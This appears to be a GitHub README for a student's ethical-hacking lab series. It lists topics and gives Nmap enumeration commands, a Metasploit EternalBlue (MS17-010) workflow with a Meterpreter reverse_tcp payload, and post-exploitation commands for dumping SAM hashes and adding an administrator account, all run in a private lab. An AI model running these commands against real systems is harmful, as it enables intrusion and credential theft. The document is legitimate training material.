# Ethical-hacking-lab-series
Hands-on network security labs covering enumeration, exploitation (EternalBlue, buffer overflows), malware analysis, web app testing, compliance scanning, and SIEM monitoring — using tools like Nmap, Metasploit, Burp Suite, SQLMap, Cuckoo Sandbox, and Wazuh.

# 🔐 Network Security Lab – Enumeration, Exploitation & Post-Exploitation

This project simulates real-world network attacks in a controlled virtual lab using **Nmap, NetBIOS tools, and Metasploit**. It walks through enumeration, vulnerability analysis, exploitation, and post-exploitation tasks — focusing on Windows XP and Metasploitable targets.

---

## 📖 About This Project

This repository is a collection of my **Network Security & Offensive Security Labs**, completed as part of my academic and independent cybersecurity training. The labs simulate real-world attack and defense scenarios using industry-standard tools and techniques. Each task was performed in a **controlled virtual environment**, ensuring both ethical practices and technical depth.

---

## ⚙️ Lab Environment

| System         | Role             | IP Address        |
|----------------|------------------|-------------------|
| Kali Linux     | Attacker         | ###.###.###.#     |
| Metasploitable | Vulnerable Host  | ###.###.###.#     |
| Windows XP     | Legacy Target    | ###.###.###.#     |
 
---

## 🧩 Topics Covered

Nmap Enumeration  
NetBIOS Scanning  
Metasploit Exploitation  
MS17-010  
EternalBlue  
Buffer Overflow  
Integer Overflow  
GDB  
DNS Footprinting  
Maltego  
SpiderFoot  
MBSA  
SCM  
Nessus  
OpenVAS  
Nexpose  
Retina  
Security Compliance  
Vulnerability Scanning  
Malware Analysis  
Cuckoo Sandbox  
Burp Suite  
SQL Injection  
XSS  
CSRF  
SQLMap  
Web Application Testing  
Wazuh  
SIEM  
Threat Detection  
Post-Exploitation  
Privilege Escalation  
Lateral Movement

---

## 🧪 Project 1: Enumeration Using Nmap & NetBIOS

### ✅ Objectives
- Discover live hosts
- Identify open ports and services
- Detect service versions for CVE mapping
- Extract NetBIOS/SMB information

### 🧰 Tools & Commands
- `nmap -sn` – Host discovery
- `nmap -sV -p-` – Full port scan + service version detection
- `nmap -sC` – Default NSE script scan
- `nbtscan -v` – NetBIOS details
- `nmap --script smb-os-discovery.nse` – SMB/OS information

---

## 💣 Project 2: Exploiting Vulnerabilities with Metasploit

### ✅ Objectives
- Identify and exploit MS17-010 vulnerability (EternalBlue)
- Gain SYSTEM access via Meterpreter shell
- Perform post-exploitation tasks (hashdump, privilege escalation, lateral movement)

### 🧰 Key Exploit Workflow
```bash
msfconsole
search ms17_010
use exploit/windows/smb/ms17_010_psexec
set RHOST 192.168.217.132
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.217.128
run
```

### 🔑 Post-Exploitation Steps
- `sysinfo` – System information
- `hashdump` – Extract SAM hashes
- `net user` – Enumerate users
- `net localgroup Administrators attacker /add` – Privilege escalation
- `net view`, `dir \\target\share` – Lateral movement & shared resource access

---

## 📌 Key Takeaways

- ✅ Enumerating service versions is critical for CVE-based targeting
- ✅ Unpatched systems like Windows XP are highly vulnerable
- ✅ SMBv1 and misconfigured shares expose serious risks
- ✅ Post-exploitation provides insight into real-world attacker behavior

---

## 🛠️ Tools Used

| Tool         | Purpose                          |
|--------------|----------------------------------|
| Nmap         | Scanning & enumeration           |
| NetBIOS/NBTScan | Legacy info gathering         |
| Metasploit   | Exploitation & payload delivery  |
| Meterpreter  | Post-exploitation interaction    |
| GDB          | Binary analysis and debugging    |
| SQLMap       | Automated SQL injection testing  |
| Burp Suite   | Web vulnerability scanning       |
| Nessus       | Vulnerability scanning           |
| OpenVAS      | Open-source vuln scanning        |
| Cuckoo Sandbox | Malware behavior analysis       |
| Wazuh        | SIEM/log analysis and detection  |
| SpiderFoot   | Automated OSINT & recon          |
| Maltego      | Infrastructure mapping and OSINT |

---

## 📄 Report
The full lab report is included in this repo as a PDF. It contains screenshots, commands used, and detailed output for every step.

> ⚠️ **Disclaimer**: All tasks were performed in an isolated lab for educational purposes only.

---

**#CyberSecurity #EthicalHacking #PenetrationTesting #Metasploit #Nmap #WindowsXP #EternalBlue #CTF #Infosec #RedTeam #LabProject**
